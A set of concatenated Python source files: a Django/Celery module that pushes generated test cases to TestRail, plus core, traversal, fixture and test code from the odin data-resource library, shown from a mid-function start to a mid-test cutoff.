        msg = push_testcases_to_testrail_celery(project.id)                    

    return msg


@app.task
def push_testcases_to_testrail_celery(project_id):
    """
    Push Testcases of project to TestRail
    :param request:
    :param project_id:
    :return:
    """
    project = get_object_or_404(Project, pk=project_id)
    testrail_contents = ''

    try:
        client = APIClient(project.testrail.instance.host)
        client.user = project.testrail.instance.username
        client.password = project.testrail.instance.password

        testrail_contents = client.send_get('get_project/' + project.testrail.project_id)

        tr_suites = client.send_get('get_suites/' + project.testrail.project_id)
        testcases = project.testcaseresults_set.latest('updated').results

        # Find or Create TestSuites in TestRail
        try:
            tr_suite = (suite for suite in tr_suites if suite['name'] == project.version).__next__()
        except StopIteration as e:
            print('Suite: ', e)
            tr_suite = add_testsuite_to_project(client,
                                                project.testrail.project_id,
                                                project.version)
            if not tr_suite:
                raise PermissionError('You are not allowed (Insufficient Permissions)')

        tr_suite_sections = client.send_get('get_sections/' + project.testrail.project_id + '&suite_id=' + str(tr_suite['id']))
        # print(tr_suite_sections)

        # Find or Create Section of TestSuites
        for item in testcases:
            try:
                section = (section for section in tr_suite_sections if section['name'] == item['module']).__next__()
                remove_section_from_testsuite(client, str(section['id']))

                section_id = add_section_to_testsuite(client,
                                                      project.testrail.project_id,
                                                      tr_suite['id'],
                                                      item['module'])

                add_testcase_to_section(client, section_id, item['data'])

            except StopIteration as e:
                print('Section: ', e)
                section_id = add_section_to_testsuite(client,
                                                      project.testrail.project_id,
                                                      tr_suite['id'],
                                                      item['module'])
                add_testcase_to_section(client, section_id, item['data'])

    except AttributeError:
        testrail_contents = {
            'error': 'No TestRail config'
        }

    except (TestCaseResults.DoesNotExist, PermissionError) as e:
        testrail_contents = {
            'error': e
        }

    return testrail_contents



import socket
from django.contrib import messages
from django.contrib.auth.decorators import login_required, user_passes_test
from django.http import HttpResponse
from django.shortcuts import get_object_or_404, render, redirect
import json


from mdta.apps.projects.models import Project, Module, TestRailInstance, TestRailConfiguration
from mdta.apps.projects.utils import context_project_dashboard
from mdta.apps.testcases.models import TestCaseResults
from mdta.apps.testcases.tasks import create_testcases_celery, push_testcases_to_testrail_celery
from mdta.apps.users.views import user_is_superuser, user_is_staff
from .utils import context_testcases, get_projects_from_testrail, create_routing_test_suite
from .forms import TestrailConfigurationForm
from mdta.apps.testcases.testrail import APIClient
from mdta.celery_module import app as celery_app


@login_required
def tcs_project(request):
    if request.user.humanresource.project:
        project = request.user.humanresource.project
        try:
            testcases = project.testcaseresults_set.latest('updated').results
        except TestCaseResults.DoesNotExist:
            testcases = []
    else:
        testcases = []
        project = None

    context = {
        'project': project,
        'testcases': testcases
    }

    if project:
        return render(request, 'testcases/tcs_project.html', context)
    else:
        return redirect('graphs:projects_for_selection')


@user_passes_test(user_is_superuser)
def testcases(request):
    context = context_testcases()

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_staff)
def create_testcases(request, object_id):
    """
    Create TestCases per project/module
    :param request:
    :param object_id: project_id/module_id
    :return:
    """

    testcases = []
    link_id = ''
    level = request.GET.get('level', '')
    if level == 'project':
        create_testcases_celery(object_id, call_from='OldTC')                    

    elif level == 'module':
        module = get_object_or_404(Module, pk=object_id)
        link_id = module.project.id
        testcases = create_routing_test_suite(modules=[module])

    context = context_testcases()
    context['testcases'] = testcases
    context['link_id'] = link_id

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_superuser)
def create_testcases_all(request):
    projects = Project.objects.all()
    for project in projects:
        create_testcases_celery.delay(project.id)

    return redirect('testcases:testcases')


@login_required
def demonstrate_testcases(request, object_id):
    """
    Demonstrate TestCases of Project/Module from TestCaseResults
    :param request:
    :param object_id:
    :return:
    """
    level = request.GET.get('level', '')
    if level == 'project':
        project = get_object_or_404(Project, pk=object_id)
        link_id = project.id
        try:
            testcases = project.testcaseresults_set.latest('updated').results
        except TestCaseResults.DoesNotExist:
            testcases = []
    elif level == 'module':
        module = get_object_or_404(Module, pk=object_id)
        link_id = module.project.id
        try:
            tmp_tcs = module.project.testcaseresults_set.latest('updated').results
            testcases = [(item for item in tmp_tcs if item['module'] == module.name).__next__()]
        except TestCaseResults.DoesNotExist:
            testcases = []
    else:
        testcases = []
        link_id = ''

    context = context_testcases()
    context['testcases'] = testcases
    context['link_id'] = link_id

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_staff)
def push_testcases_to_testrail(request, project_id):
    """
    Push Testcases of project to TestRail
    :param request:
    :param project_id:
    :return:
    """
    testrail_contents = push_testcases_to_testrail_celery.delay(project_id)
    # testrail_contents = push_testcases_to_testrail_celery.delay(project_id)

    context = context_testcases()
    context['testrail'] = testrail_contents
    context['link_id'] = project_id

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_staff)
def testrail_configuration_new(request):
    if request.method == 'GET':
        context = {
            'form': TestrailConfigurationForm()
        }
        return render(request, 'testcases/tc_testrails_new.html', context)
    elif request.method == 'POST':
        # print(request.POST)

        instance = get_object_or_404(TestRailInstance, username='testrail@west.com')
        testrail_projects = get_projects_from_testrail(instance)

        form = TestrailConfigurationForm(request.POST)
        if form.is_valid():
            suites = []
            testrail_new = form.save(commit=False)
            testrail_find = next(item for item in testrail_projects if item['name'] == testrail_new.project_name)
            testrail_new.project_id = testrail_find['id']

            client = APIClient(testrail_new.instance.host)
            client.user = testrail_new.instance.username
            client.password = testrail_new.instance.password
            testrail_find_suites = client.send_get('get_suites/' + str(testrail_new.project_id))
            for suite in testrail_find_suites:
                suites.append(suite['name'])
            testrail_new.test_suite = suites

            testrail_new.save()
        else:
            messages.error(request, form.errors)

        context = context_project_dashboard(request)
        context['last_tab'] = 'test_rails'

        return render(request, 'projects/project_dashboard.html', context)


@user_passes_test(user_is_superuser)
def testrail_configuration_delete(request, testrail_id):
    testrail = get_object_or_404(TestRailConfiguration, pk=testrail_id)

    testrail.delete()

    context = context_project_dashboard(request)
    context['last_tab'] = 'test_rails'

    return render(request, 'projects/project_dashboard.html', context)


@user_passes_test(user_is_superuser)
def testrail_configuration_update(request, testrail_id):
    suites = []
    testrail = get_object_or_404(TestRailConfiguration, pk=testrail_id)

    client = APIClient(testrail.instance.host)
    client.user = testrail.instance.username
    client.password = testrail.instance.password
    testrail_find_suites = client.send_get('get_suites/' + str(testrail.project_id))
    for suite in testrail_find_suites:
        suites.append(suite['name'])

    if testrail.test_suite != suites:
        testrail.test_suite = suites
        testrail.save()

    context = context_project_dashboard(request)
    context['last_tab'] = 'test_rails'

    return render(request, 'projects/project_dashboard.html', context)


def check_celery_task_state(request):
    task_run = False
    active = celery_app.control.inspect().active()

    # celery worker node name
    key = 'celery@' + socket.gethostname() + '.mdta'
    try:
        if active[key]:
            project_id = active[key][0]['args']
            project_id = ''.join(c for c in project_id if c not in '\'(),')
            if int(project_id) == request.user.humanresource.project.id:
                task_run = True
    except (KeyError, TypeError):
        task_run = True

    return HttpResponse(json.dumps(task_run), content_type='application/json')



# -*- coding: utf-8 -*-
import copy
import six
from odin import exceptions, registration
from odin.exceptions import ValidationError
from odin.fields import NOT_PROVIDED
from odin.utils import cached_property, field_iter_items


DEFAULT_TYPE_FIELD = '$'
META_OPTION_NAMES = (
    'name', 'namespace', 'name_space', 'verbose_name', 'verbose_name_plural', 'abstract', 'doc_group', 'type_field',
    'key_field'                    
)


class ResourceOptions(object):
    def __init__(self, meta):
        self.meta = meta
        self.parents = []
        self.fields = []
        self.virtual_fields = []

        self.name = None
        self.class_name = None
        self.name_space = NOT_PROVIDED
        self.verbose_name = None
        self.verbose_name_plural = None
        self.abstract = False
        self.doc_group = None
        self.type_field = DEFAULT_TYPE_FIELD
        self.key_field = None                    

        self._cache = {}

    def contribute_to_class(self, cls, name):
        cls._meta = self
        self.name = cls.__name__
        self.class_name = "%s.%s" % (cls.__module__, cls.__name__)

        if self.meta:
            meta_attrs = self.meta.__dict__.copy()
            for name in self.meta.__dict__:
                if name.startswith('_'):
                    del meta_attrs[name]
            for attr_name in META_OPTION_NAMES:
                if attr_name in meta_attrs:
                    # Allow meta to be defined as namespace
                    if attr_name == 'namespace':
                        setattr(self, 'name_space', meta_attrs.pop(attr_name))
                    else:
                        setattr(self, attr_name, meta_attrs.pop(attr_name))
                elif hasattr(self.meta, attr_name):
                    setattr(self, attr_name, getattr(self.meta, attr_name))

            # Any leftover attributes must be invalid.
            if meta_attrs != {}:
                raise TypeError("'class Meta' got invalid attribute(s): %s" % ','.join(meta_attrs.keys()))
        del self.meta

        if not self.verbose_name:
            self.verbose_name = self.name.replace('_', ' ').strip('_ ')
        if not self.verbose_name_plural:
            self.verbose_name_plural = self.verbose_name + 's'

    def add_field(self, field):
        self.fields.append(field)
        cached_property.clear_caches(self)

    def add_virtual_field(self, field):
        self.virtual_fields.append(field)
        cached_property.clear_caches(self)

    @property
    def resource_name(self):
        """
        Full name of resource including namespace (if specified)
        """
        if self.name_space:
            return "%s.%s" % (self.name_space, self.name)
        else:
            return self.name

    @cached_property
    def all_fields(self):
        """
        All fields both standard and virtual.
        """
        return self.fields + self.virtual_fields

    @cached_property
    def composite_fields(self):
        """
        All composite fields.
        """
        # Not the nicest solution but is a fairly safe way of detecting a composite field.
        return [f for f in self.fields if (hasattr(f, 'of') and issubclass(f.of, Resource))]

    @cached_property
    def container_fields(self):
        """
        All composite fields with the container flag.

        Used by XML like codecs.

        """
        return [f for f in self.composite_fields if getattr(f, 'use_container', False)]

    @cached_property
    def field_map(self):
        return {f.attname: f for f in self.fields}

    @cached_property
    def parent_resource_names(self):
        """
        List of parent resource names.
        """
        return [p._meta.resource_name for p in self.parents]

    @cached_property
    def attribute_fields(self):
        """
        List of fields where is_attribute is True.
        """
        return [f for f in self.fields if f.is_attribute]

    @cached_property
    def element_fields(self):
        """
        List of fields where is_attribute is False.
        """
        return [f for f in self.fields if not f.is_attribute]

    @cached_property
    def element_field_map(self):
        return {f.attname: f for f in self.element_fields}

    def __repr__(self):
        return '<Options for %s>' % self.resource_name


class ResourceBase(type):
    """
    Metaclass for all Resources.
    """
    def __new__(cls, name, bases, attrs):
        super_new = super(ResourceBase, cls).__new__

        # attrs will never be empty for classes declared in the standard way
        # (ie. with the `class` keyword). This is quite robust.
        if name == 'NewBase' and attrs == {}:
            return super_new(cls, name, bases, attrs)

        parents = [b for b in bases if isinstance(b, ResourceBase) and not (b.__name__ == 'NewBase'
                                                                            and b.__mro__ == (b, object))]
        if not parents:
            # If this isn't a subclass of Resource, don't do anything special.
            return super_new(cls, name, bases, attrs)

        # Create the class.
        module = attrs.pop('__module__')
        new_class = super_new(cls, name, bases, {'__module__': module})
        attr_meta = attrs.pop('Meta', None)
        abstract = getattr(attr_meta, 'abstract', False)
        if not attr_meta:
            meta = getattr(new_class, 'Meta', None)
        else:
            meta = attr_meta
        base_meta = getattr(new_class, '_meta', None)

        new_class.add_to_class('_meta', ResourceOptions(meta))

        # Generate a namespace if one is not provided
        if new_class._meta.name_space is NOT_PROVIDED and base_meta:
            # Namespace is inherited
            if (not new_class._meta.name_space) or (new_class._meta.name_space is NOT_PROVIDED):
                new_class._meta.name_space = base_meta.name_space

        if new_class._meta.name_space is NOT_PROVIDED:
            new_class._meta.name_space = module

        # Bail out early if we have already created this class.
        r = registration.get_resource(new_class._meta.resource_name)
        if r is not None:
            return r

        # Add all attributes to the class.
        for obj_name, obj in attrs.items():
            new_class.add_to_class(obj_name, obj)

        # Sort the fields
        new_class._meta.fields = sorted(new_class._meta.fields, key=hash)

        # All the fields of any type declared on this model
        local_field_attnames = set([f.attname for f in new_class._meta.fields])
        field_attnames = set(local_field_attnames)

        for base in parents:
            if not hasattr(base, '_meta'):
                # Things without _meta aren't functional models, so they're
                # uninteresting parents.
                continue

            # Check for clashes between locally declared fields and those
            # on the base classes (we cannot handle shadowed fields at the
            # moment).
            for field in base._meta.all_fields:
                if field.attname in local_field_attnames:
                    raise Exception('Local field %r in class %r clashes with field of similar name from '
                                    'base class %r' % (field.attname, name, base.__name__))
            for field in base._meta.fields:
                if field.attname not in field_attnames:
                    field_attnames.add(field.attname)
                    new_class.add_to_class(field.attname, copy.deepcopy(field))
            for field in base._meta.virtual_fields:
                new_class.add_to_class(field.attname, copy.deepcopy(field))

            new_class._meta.parents += base._meta.parents
            new_class._meta.parents.append(base)

        # If a key_field is defined ensure it exists
        if new_class._meta.key_field is not None:                    
            if new_class._meta.key_field not in field_attnames:                    
                raise Exception('Key field `{}` is not exist on this resource.'.format(new_class._meta.key_field))                    

        if abstract:
            return new_class

        # Register resource
        registration.register_resources(new_class)

        # Because of the way imports happen (recursively), we may or may not be
        # the first time this model tries to register with the framework. There
        # should only be one class for each model, so we always return the
        # registered version.
        return registration.get_resource(new_class._meta.resource_name)

    def add_to_class(cls, name, value):
        if hasattr(value, 'contribute_to_class'):
            value.contribute_to_class(cls, name)
        else:
            setattr(cls, name, value)


@six.add_metaclass(ResourceBase)
class Resource(object):
    def __init__(self, *args, **kwargs):
        args_len = len(args)
        if args_len > len(self._meta.fields):
            raise TypeError('This resource takes %s positional arguments but %s where given.' % (
                len(self._meta.fields), args_len))

        # The ordering of the zip calls matter - zip throws StopIteration
        # when an iter throws it. So if the first iter throws it, the second
        # is *not* consumed. We rely on this, so don't change the order
        # without changing the logic.
        fields_iter = iter(self._meta.fields)
        if args_len:
            if not kwargs:
                for val, field in zip(args, fields_iter):
                    setattr(self, field.attname, val)
            else:
                for val, field in zip(args, fields_iter):
                    setattr(self, field.attname, val)
                    kwargs.pop(field.name, None)

        # Now we're left with the unprocessed fields that *must* come from
        # keywords, or default.
        for field in fields_iter:
            try:
                val = kwargs.pop(field.attname)
            except KeyError:
                val = field.get_default()
            setattr(self, field.attname, val)

        if kwargs:
            raise TypeError("'%s' is an invalid keyword argument for this function" % list(kwargs)[0])

    def __repr__(self):
        return '<%s: %s>' % (self.__class__.__name__, self)

    def __str__(self):
        return '%s resource' % self._meta.resource_name

    @classmethod
    def create_from_dict(cls, d, full_clean=False):
        """
        Create a resource instance from a dictionary.
        """
        return create_resource_from_dict(d, cls, full_clean)

    def to_dict(self, include_virtual=True):
        """
        Convert this resource into a `dict` of field_name/value pairs.

        .. note::
            This method is not recursive, it only operates on this single resource, any sub resources are returned as
            is. The use case that prompted the creation of this method is within codecs when a resource must be
            converted into a type that can be serialised, these codecs then operate recursively on the returned `dict`.

        :param include_virtual: Include virtual fields when generating `dict`.

        """
        fields = self._meta.all_fields if include_virtual else self._meta.fields
        return dict((f.name, v) for f, v in field_iter_items(self, fields))

    def convert_to(self, to_resource, context=None, ignore_fields=None, **field_values):
        """
        Convert this resource into a specified resource.

        A mapping must be defined for conversion between this resource and to_resource or an exception will be raised.

        """
        mapping = registration.get_mapping(self.__class__, to_resource)
        ignore_fields = ignore_fields or []
        ignore_fields.extend(mapping.exclude_fields)
        self.full_clean(ignore_fields)
        return mapping(self, context).convert(**field_values)

    def update_existing(self, dest_obj, context=None, ignore_fields=None):
        """
        Update the fields on an existing destination object.

        A mapping must be defined for conversion between this resource and ``dest_obj`` type or an exception will be
        raised.

        """
        self.full_clean(ignore_fields)
        mapping = registration.get_mapping(self.__class__, dest_obj.__class__)
        return mapping(self, context).update(dest_obj, ignore_fields)

    def extra_attrs(self, attrs):
        """
        Called during de-serialisation of data if there are any extra fields defined in the document.

        This allows the resource to decide how to handle these fields. By default they are ignored.
        """
        pass

    def clean(self):
        """
        Chance to do more in depth validation.
        """
        pass

    def full_clean(self, exclude=None):
        """
        Calls clean_fields, clean on the resource and raises ``ValidationError``
        for any errors that occurred.
        """
        errors = {}

        try:
            self.clean_fields(exclude)
        except ValidationError as e:
            errors = e.update_error_dict(errors)

        try:
            self.clean()
        except ValidationError as e:
            errors = e.update_error_dict(errors)

        if errors:
            raise ValidationError(errors)

    def clean_fields(self, exclude=None):
        errors = {}

        for f in self._meta.fields:
            if exclude and f.name in exclude:
                continue

            raw_value = f.value_from_object(self)

            if f.null and raw_value is None:
                continue

            try:
                raw_value = f.clean(raw_value)
            except ValidationError as e:
                errors[f.name] = e.messages

            # Check for resource level clean methods.
            clean_method = getattr(self, "clean_%s" % f.attname, None)
            if callable(clean_method):
                try:
                    raw_value = clean_method(raw_value)
                except ValidationError as e:
                    errors.setdefault(f.name, []).extend(e.messages)

            setattr(self, f.attname, raw_value)

        if errors:
            raise ValidationError(errors)


def resolve_resource_type(resource):
    if isinstance(resource, type) and issubclass(resource, Resource):
        return resource._meta.resource_name, resource._meta.type_field
    else:
        return resource, DEFAULT_TYPE_FIELD


def create_resource_from_dict(d, resource=None, full_clean=True, copy_dict=True):
    """
    Create a resource from a dict.

    :param d: dictionary of data.
    :param resource: A resource type, resource name or list of resources and names to use as the base for creating a
        resource. If a list is supplied the first item will be used if a resource type is not supplied; this could also
        be a parent(s) of any resource defined by the dict.
    :param full_clean: Do a full clean as part of the creation.
    :param copy_dict: Use a copy of the input dictionary rather than destructively processing the input dict.

    """
    assert isinstance(d, dict)

    if copy_dict:
        d = d.copy()

    if resource:
        resource_type = None

        # Convert to single resource then resolve document type
        if isinstance(resource, (tuple, list)):
            resources = (resolve_resource_type(r) for r in resource)
        else:
            resources = [resolve_resource_type(resource)]

        for resource_name, type_field in resources:
            # See if the input includes a type field  and check it's registered
            document_resource_name = d.get(type_field, None)
            if document_resource_name:
                resource_type = registration.get_resource(document_resource_name)
            else:
                resource_type = registration.get_resource(resource_name)

            if not resource_type:
                raise exceptions.ResourceException("Resource `%s` is not registered." % document_resource_name)

            if document_resource_name:
                # Check resource types match or are inherited types
                if (resource_name == document_resource_name or
                        resource_name in resource_type._meta.parent_resource_names):
                    break  # We are done
            else:
                break

        if not resource_type:
            raise exceptions.ResourceException(
                "Incoming resource does not match [%s]" % ', '.join(r for r, t in resources))
    else:
        # No resource specified, relay on type field
        document_resource_name = d.pop(DEFAULT_TYPE_FIELD, None)
        if not document_resource_name:
            raise exceptions.ResourceException("Resource not defined.")

        # Get an instance of a resource type
        resource_type = registration.get_resource(document_resource_name)
        if not resource_type:
            raise exceptions.ResourceException("Resource `%s` is not registered." % document_resource_name)

    attrs = []
    errors = {}
    for f in resource_type._meta.fields:
        value = d.pop(f.name, NOT_PROVIDED)
        if value is NOT_PROVIDED:
            value = f.get_default() if f.use_default_if_not_provided else None
        else:
            try:
                value = f.to_python(value)
            except ValidationError as ve:
                errors[f.name] = ve.error_messages
        attrs.append(value)

    if errors:
        raise ValidationError(errors)

    new_resource = resource_type(*attrs)
    if d:
        new_resource.extra_attrs(d)
    if full_clean:
        new_resource.full_clean()
    return new_resource


def build_object_graph(d, resource=None, full_clean=True, copy_dict=True):
    """
    Generate an object graph from a dict

    :param resource: A resource type, resource name or list of resources and names to use as the base for creating a
        resource. If a list is supplied the first item will be used if a resource type is not supplied.
    :raises ValidationError: During building of the object graph and issues discovered are raised as a ValidationError.
    """

    if isinstance(d, dict):
        return create_resource_from_dict(d, resource, full_clean, copy_dict)

    if isinstance(d, list):
        return [build_object_graph(o, resource, full_clean, copy_dict) for o in d]

    return d


class ResourceIterable(object):
    """
    Iterable that yields resources.
    """
    def __init__(self, sequence):
        self.sequence = sequence

    def __iter__(self):
        for item in self.sequence:
            yield item

# -*- coding: utf-8 -*-
import six


class NotSupplied(object):
    pass


def _split_atom(atom):
    if '[' in atom:
        field, _, idx = atom.rstrip(']').partition('[')
        return idx, NotSupplied, field
    elif '{' in atom:
        field, _, kv = atom.rstrip('}').partition('{')
        key, _, value = kv.partition('=')
        return value, key, field
    else:
        return NotSupplied, NotSupplied, atom


class TraversalPath(object):
    """
    A path through a resource structure.
    """
    @classmethod
    def parse(cls, path):
        if isinstance(path, TraversalPath):
            return path
        if isinstance(path, six.string_types):
            return cls(*[_split_atom(a) for a in path.split('.')])

    def __init__(self, *path):
        self._path = path

    def __repr__(self):
        return "<TraversalPath: %s>" % self

    def __str__(self):
        atoms = []
        for value, key, field in self._path:
            if value is NotSupplied:
                atoms.append(field)
            elif key is NotSupplied:
                atoms.append("{}[{}]".format(field, value))
            else:
                atoms.append("{}{{{}={}}}".format(field, key, value))
        return '.'.join(atoms)

    def __hash__(self):
        return hash(self._path)

    def __eq__(self, other):
        if isinstance(other, TraversalPath):
            return hash(self) == hash(other)
        return False

    def __add__(self, other):
        if isinstance(other, TraversalPath):
            return TraversalPath(*(self._path + other._path))

        # Assume appending a field
        if isinstance(other, six.string_types):
            return TraversalPath(*(self._path + tuple([(NotSupplied, NotSupplied, other)])))

        raise TypeError("Cannot add '%s' to a path." % other)

    def __iter__(self):
        return iter(self._path)

    def get_value(self, root_resource):
        """
        Get a value from a resource structure.
        """
        result = root_resource
        for value, key, attr in self:
            field = result._meta.field_map[attr]
            result = field.value_from_object(result)
            if value is NotSupplied:
                continue
            elif key is NotSupplied:
                value = field.key_to_python(value)
                result = result[value]
            else:
                pass
        return result


class ResourceTraversalIterator(object):
    """
    Iterator for traversing (walking) a resource structure, including traversing composite fields to fully navigate a
    resource tree.

    This class has hooks that can be used by subclasses to customise the behaviour of the class:

     - *on_enter* - Called after entering a new resource.
     - *on_exit* - Called after exiting a resource.

    """
    def __init__(self, resource):
        if isinstance(resource, (list, tuple)):
            # Stack of resource iterators (starts initially with entries from the list)
            self._resource_iters = [iter([(i, r) for i, r in enumerate(resource)])]
        else:
            # Stack of resource iterators (starts initially with single entry of the root resource)
            self._resource_iters = [iter([(None, resource)])]
        # Stack of composite fields, found on each resource, each composite field is interrogated for resources.
        self._field_iters = []
        # The "path" to the current resource.
        self._path = [(NotSupplied, NotSupplied, NotSupplied)]
        self._resource_stack = [None]

    def __iter__(self):
        return self

    def __next__(self):
        if self._resource_iters:
            if self._field_iters:
                # Check if the last entry in the field stack has any unprocessed fields.
                if self._field_iters[-1]:
                    # Select the very last field in the field stack.
                    field = self._field_iters[-1][0]
                    # Request a list of resources along with keys from the composite field.
                    self._resource_iters.append(field.item_iter_from_object(self.current_resource))
                    # Update the path
                    self._path.append((NotSupplied, NotSupplied, field.name))
                    self._resource_stack.append(None)
                    # Remove the field from the list (and remove this field entry if it has been emptied)
                    self._field_iters[-1].pop(0)
                else:
                    self._field_iters.pop()

            if self.current_resource:
                if hasattr(self, 'on_exit'):
                    self.on_exit()

            try:
                key, next_resource = next(self._resource_iters[-1])
            except StopIteration:
                # End of the current list of resources pop this list off and get the next list.
                self._path.pop()
                self._resource_iters.pop()
                self._resource_stack.pop()

                return next(self)
            else:
                # If we have a key (ie DictOf, ListOf composite fields) update the path key field.
                if key is not None:
                    _, _, field = self._path[-1]                    
                    self._path[-1] = (key, NotSupplied, field)

                # Get list of any composite fields for this resource (this is a cached field).
                self._field_iters.append(list(next_resource._meta.composite_fields))

                # self.current_resource = next_resource
                self._resource_stack[-1] = next_resource

                if hasattr(self, 'on_enter'):
                    self.on_enter()
                return next_resource
        else:
            raise StopIteration()

    # Python 2.x compatibility
    next = __next__

    @property
    def path(self):
        """
        Path to the current resource node in the tree structure.

        This path can be used to later traverse the tree structure to find get to the specified resource.
        """
        # The path is offset by one as the path includes the root to simplify next method.
        return TraversalPath(*self._path[1:])

    @property
    def depth(self):
        """
        Depth of the current resource in the tree structure.
        """
        return len(self._path) - 1

    @property
    def current_resource(self):
        if self._resource_stack:
            return self._resource_stack[-1]

# -*- coding: utf-8 -*-
import odin
from odin.fields.virtual import CalculatedField
from odin.mapping.helpers import sum_fields


class Author(odin.Resource):
    name = odin.StringField()

    class Meta:
        name_space = None


class Publisher(odin.Resource):
    name = odin.StringField()

    class Meta:
        name_space = None


class LibraryBook(odin.Resource):
    class Meta:
        abstract = True
        name_space = "library"


class Book(LibraryBook):
    class Meta:
        key_field = 'isbn'                    

    title = odin.StringField()
    isbn = odin.StringField()
    num_pages = odin.IntegerField()
    rrp = odin.FloatField(default=20.4, use_default_if_not_provided=True)
    fiction = odin.BooleanField(is_attribute=True)
    genre = odin.StringField(choices=(
        ('sci-fi', 'Science Fiction'),
        ('fantasy', 'Fantasy'),
        ('biography', 'Biography'),
        ('others', 'Others'),
        ('computers-and-tech', 'Computers & technology'),
    ))
    published = odin.TypedArrayField(odin.DateTimeField())
    authors = odin.ArrayOf(Author, use_container=True)
    publisher = odin.DictAs(Publisher, null=True)

    def __eq__(self, other):
        if other:
            return vars(self) == vars(other)
        return False


class Subscriber(odin.Resource):
    name = odin.StringField()
    address = odin.StringField()

    def __eq__(self, other):
        if other:
            return self.name == other.name and self.address == other.address


class Library(odin.Resource):
    name = odin.StringField()
    books = odin.ArrayOf(LibraryBook)
    subscribers = odin.ArrayOf(Subscriber, null=True)
    book_count = CalculatedField(lambda o: len(o.books))

    class Meta:
        name_space = None


class OldBook(LibraryBook):
    name = odin.StringField()
    num_pages = odin.IntegerField()
    price = odin.FloatField()
    genre = odin.StringField(choices=(
        ('sci-fi', 'Science Fiction'),
        ('fantasy', 'Fantasy'),
        ('biography', 'Biography'),
        ('others', 'Others'),
        ('computers-and-tech', 'Computers & technology'),
    ))
    published = odin.DateTimeField()
    author = odin.ObjectAs(Author)
    publisher = odin.ObjectAs(Publisher)


class OldBookToBookMapping(odin.Mapping):
    from_obj = OldBook
    to_obj = Book

    exclude_fields = ('',)

    mappings = (
        ('name', None, 'title'),
    )


class ChildResource(odin.Resource):
    name = odin.StringField()


class FromResource(odin.Resource):
    # Auto matched
    title = odin.StringField()
    count = odin.StringField()
    child = odin.ObjectAs(ChildResource)
    children = odin.ArrayOf(ChildResource)
    # Excluded
    excluded1 = odin.FloatField()
    # Mappings
    from_field1 = odin.StringField()
    from_field2 = odin.StringField()
    from_field3 = odin.IntegerField()
    from_field4 = odin.IntegerField()
    same_but_different = odin.StringField()
    # Custom mappings
    from_field_c1 = odin.StringField()
    from_field_c2 = odin.StringField()
    from_field_c3 = odin.StringField()
    from_field_c4 = odin.StringField()
    not_auto_c5 = odin.StringField()
    comma_separated_string = odin.StringField()
    # Virtual fields
    constant_field = odin.ConstantField(value=10)


class InheritedResource(FromResource):
    # Additional fields
    name = odin.StringField()
    # Additional virtual fields
    calculated_field = odin.CalculatedField(lambda obj: 11)


class MultiInheritedResource(InheritedResource, FromResource):
    pass


class ToResource(odin.Resource):
    # Auto matched
    title = odin.StringField()
    count = odin.IntegerField()
    child = odin.ObjectAs(ChildResource)
    children = odin.ArrayOf(ChildResource)
    # Excluded
    excluded1 = odin.FloatField()
    # Mappings
    to_field1 = odin.StringField()
    to_field2 = odin.IntegerField()
    to_field3 = odin.IntegerField()
    same_but_different = odin.StringField()
    # Custom mappings
    to_field_c1 = odin.StringField()
    to_field_c2 = odin.StringField()
    to_field_c3 = odin.StringField()
    not_auto_c5 = odin.StringField()
    array_string = odin.TypedArrayField(odin.StringField())
    assigned_field = odin.StringField()


class FromToMapping(odin.Mapping):
    from_obj = FromResource
    to_obj = ToResource

    exclude_fields = ('excluded1',)

    mappings = (
        ('from_field1', None, 'to_field1'),
        ('from_field2', int, 'to_field2'),
        (('from_field3', 'from_field4'), sum_fields, 'to_field3'),
        ('from_field1', None, 'same_but_different'),
    )

    @odin.map_field(from_field=('from_field_c1', 'from_field_c2', 'from_field_c3'), to_field='to_field_c1')
    def multi_to_one(self, *values):
        return '-'.join(values)

    @odin.map_field(from_field='from_field_c4', to_field=('to_field_c2', 'to_field_c3'))
    def one_to_multi(self, value):
        return value.split('-', 1)

    @odin.map_field
    def not_auto_c5(self, value):
        return value.upper()

    @odin.map_list_field(to_field='array_string')
    def comma_separated_string(self, value):
        return value.split(',')

    @odin.assign_field
    def assigned_field(self):
        return 'Foo'

import unittest
import odin
from odin import traversal


class Level3(odin.Resource):
    class Meta:
        namespace = 'odin.traversal'

    name = odin.StringField()


class Level2(odin.Resource):
    class Meta:
        namespace = 'odin.traversal'

    name = odin.StringField()
    level3s = odin.ListOf(Level3)


class Level1(odin.Resource):
    class Meta:
        namespace = 'odin.traversal'

    name = odin.StringField()
    level2 = odin.DictAs(Level2)
    level2s = odin.DictOf(Level2)


TEST_STRUCTURE = Level1(
    name='a',
    level2=Level2(name='b', level3s=[]),
    level2s=dict(
        a=Level2(name='c', level3s=[]),
        b=Level2(name='d', level3s=[Level3(name='e'), Level3(name='f')]),
        c=Level2(name='g', level3s=[Level3(name='h')]),
    )
)

TEST_LIST_STRUCTURE = [
    Level1(
        name='a',
        level2=Level2(name='b', level3s=[]),
        level2s=dict(
            a=Level2(name='c', level3s=[]),
            b=Level2(name='d', level3s=[Level3(name='e'), Level3(name='f')]),
            c=Level2(name='g', level3s=[Level3(name='h')]),
        )
    ),
    Level1(
        name='i',
        level2=Level2(name='j', level3s=[]),
        level2s=dict(
            a=Level2(name='k', level3s=[]),
            b=Level2(name='l', level3s=[Level3(name='m'), Level3(name='n')]),
            c=Level2(name='o', level3s=[Level3(name='p')]),
        )
    )
]


class TestResourceTraversalIterator(traversal.ResourceTraversalIterator):
    def __init__(self, resource):
        super(TestResourceTraversalIterator, self).__init__(resource)
        self.events = []

    def on_pre_enter(self):
        self.events.append("on_pre_enter: %s" % self.path)

    def on_enter(self):
        self.events.append("on_enter: %s" % self.path)

    def on_exit(self):
        self.events.append("on_exit: %s" % self.path)


class TraversalTestCase(unittest.TestCase):
    def test_structure(self):
        TEST_STRUCTURE.full_clean()

        resource_iter = TestResourceTraversalIterator(TEST_STRUCTURE)
        resources = ["%s %s %s" % (r, r.name, resource_iter.depth) for r in resource_iter]

        self.assertListEqual([
            'on_enter: ',
                'on_enter: level2',
                'on_exit: level2',
                'on_enter: level2s[a]',
                'on_exit: level2s[a]',
                'on_enter: level2s[b]',
                    'on_enter: level2s[b].level3s[0]',                    
                    'on_exit: level2s[b].level3s[0]',                    
                    'on_enter: level2s[b].level3s[1]',                    
                    'on_exit: level2s[b].level3s[1]',                    
                'on_exit: level2s[b]',
                'on_enter: level2s[c]',
                'on_enter: level2s[c].level3s[0]',                    
